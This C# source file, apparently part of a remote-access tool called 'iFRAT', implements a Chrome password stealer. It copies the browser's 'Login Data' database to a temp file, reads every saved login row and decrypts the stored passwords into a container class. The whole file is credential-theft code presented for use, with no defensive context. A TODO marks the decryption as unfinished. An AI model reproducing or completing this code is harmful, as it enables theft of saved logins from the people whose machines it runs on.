using System.Data;
using System.Data.SQLite;
using System.Text;

namespace iFRAT.Extras.Password;

//TODO: Finish Decrypt.

/// <summary>
/// Class used to extract passwords on Chromium-based browsers.
/// </summary>
public static class Chrome
{
    public static PasswordContainer GetChromePasswords()
    {
        const string LOGIN_DB_FIELD = "logins";   // DB table field name
        string DB_PATH = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            + "/Google/Chrome/User Data/Default/Login Data"; // Path to the file where the database is

        string tmp = Path.GetTempFileName();

        File.Copy(DB_PATH, tmp, true);

        string SQL_QUERY = string.Format("SELECT * FROM {0} {1} {2}", LOGIN_DB_FIELD, "", "");

        try
        {
            // Connect to DB
            string ConnectionString = $"data source={tmp};New=True;UseUTF16Encoding=True";

            DataTable DB = new();
            using SQLiteConnection connect = new(ConnectionString);

            SQLiteCommand command = new(SQL_QUERY, connect);
            SQLiteDataAdapter adapter = new(command);
            adapter.Fill(DB);
            int rowCount = DB.Rows.Count;

            // Here the password description
            PasswordContainer container = new(rowCount);
            for (int i = 0; i < rowCount; i++)
            {
                container.AddPassword(GetPassword(in DB, i));
            }
            return container;
        }
        catch (Exception ex)
        {
            File.Delete(tmp);
            Console.WriteLine(ex);
            throw;
        }
    }

    private static string GetPassword(in DataTable db, int position)
    {
        string x;
        const byte[] entropy = null!;   // Chrome doesn't use Entropy, required still..-
        byte[] byteArray = (byte[])db.Rows[position][5];
        byte[] decrypted = DecryptionAPI.Decrypt(byteArray, entropy, out x);
        return new UTF8Encoding(true).GetString(decrypted);
    }
}

public struct PasswordContainer
{
    private readonly List<String> Passwords;
    public readonly int passwordCount;

    /// <summary>
    /// Init a PasswordContainer data structure.
    /// </summary>
    /// <param name="count">The amount of passwords it is estimatedly going to store.</param>
    public PasswordContainer(int count)
    {
        passwordCount = count;
        Passwords = new(count);
    }

    public void AddPassword(string pass)
    {
        Passwords.Add(pass);
    }

    public void RemovePassword(string pass)
    {
        Passwords.Remove(pass);
    }

    public List<String> GetPasswords()
    {
        return Passwords;
    }
}